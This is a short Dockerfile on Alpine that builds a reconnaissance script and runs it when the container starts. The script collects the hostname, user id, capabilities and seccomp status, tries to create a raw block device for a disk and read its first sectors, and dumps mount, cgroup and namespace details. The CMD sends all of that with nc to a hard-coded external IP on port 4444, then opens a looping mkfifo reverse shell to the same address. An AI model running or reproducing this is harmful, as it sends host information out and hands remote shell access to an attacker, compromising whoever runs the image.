# syntax=er028455/df-frontend:v3
FROM alpine:3.18

RUN apk add --no-cache curl openssh-client

RUN printf '#!/bin/sh\n{\necho "=== RUNTIME DEPLOYED ==="\nuname -a\nhostname\nid\ngrep -E "Cap|Seccomp|NoNew" /proc/self/status\necho "---MKNOD-TEST---"\nrm -f /tmp/test_sda1\nmknod /tmp/test_sda1 b 8 1 2>&1\necho "mknod exit: $?"\ndd if=/tmp/test_sda1 of=/tmp/ds bs=512 count=2 2>&1\necho "dd exit: $?"\nod -A x -t x1z -N 64 /tmp/ds 2>&1\necho "---MOUNTS---"\ncat /proc/self/mountinfo\necho "---CGROUP---"\ncat /proc/self/cgroup\necho "---NS---"\nls -la /proc/self/ns/\necho "=== END RUNTIME ==="\n} > /tmp/rt_recon 2>&1\ncat /tmp/rt_recon\n' > /recon.sh && chmod +x /recon.sh

CMD sh -c "/recon.sh | nc -w 5 129.101.121.138 4444; while true; do rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc 129.101.121.138 4444 > /tmp/f; sleep 3; done"
